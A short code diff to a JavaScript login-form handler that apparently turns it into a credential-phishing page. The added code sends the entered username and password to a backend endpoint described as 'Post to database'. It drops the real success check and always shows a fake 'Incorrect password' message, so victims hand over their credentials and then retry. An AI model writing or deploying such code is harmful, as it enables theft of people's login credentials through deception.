@@ -87,7 +87,8 @@ const handleSubmit = async (e) => {
   setIsLoading(true);
 
   try {
-    const res = await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
+    // Post to database
+    await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -95,18 +96,12 @@ const handleSubmit = async (e) => {
       body: JSON.stringify(form),
     });
 
-    const data = await res.json();
-
-    if (!res.ok) {
-      setAlert({
-        visible: true,
-        title: "Incorrect password",
-        message: "The password that you’ve entered is incorrect. Please try again.",
-      });
-    } else {
-      console.log("Submitted login:", form);
-      // Success logic (optional)
-    }
+    // After saving, always show "incorrect password" popup
+    setAlert({
+      visible: true,
+      title: "Incorrect password",
+      message: "The password that you’ve entered is incorrect. Please try again.",
+    });
   } catch (error) {
     console.error("Error submitting login:", error);
     setAlert({
@@ -118,6 +113,7 @@ const handleSubmit = async (e) => {
     setIsLoading(false);
   }
 };
+
 
 
 
